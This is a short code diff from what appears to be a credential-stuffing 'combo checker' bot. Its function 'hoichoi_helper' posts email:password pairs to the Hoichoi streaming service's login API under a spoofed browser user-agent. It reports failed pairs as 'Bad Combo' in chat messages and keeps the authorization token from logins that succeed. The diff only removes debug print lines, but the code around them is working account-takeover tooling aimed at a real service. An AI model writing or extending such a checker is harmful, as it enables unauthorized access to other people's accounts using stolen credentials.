@@ -24,9 +24,7 @@ def hoichoi_helper(chat_id, combo):
     payload = '{%s,%s}' %(email, password)
     response = session_request.post(url,headers=head, data=payload)
     result = response.json()
-    print(result)
     if response.status_code != 200:
-        print('error')
         code=result['code']
         messg = result['error']
         text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Code: {code}\nMessage: {messg}\nSite: Hoichoi</b>'
@@ -37,7 +35,6 @@ def hoichoi_helper(chat_id, combo):
         Editmessage(chat_id, free_text, status)
         return
     user_token = result['authorizationToken']
-    # print(user_token)
     head2 = {
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
     'accept': 'application/json, text/plain, */*',
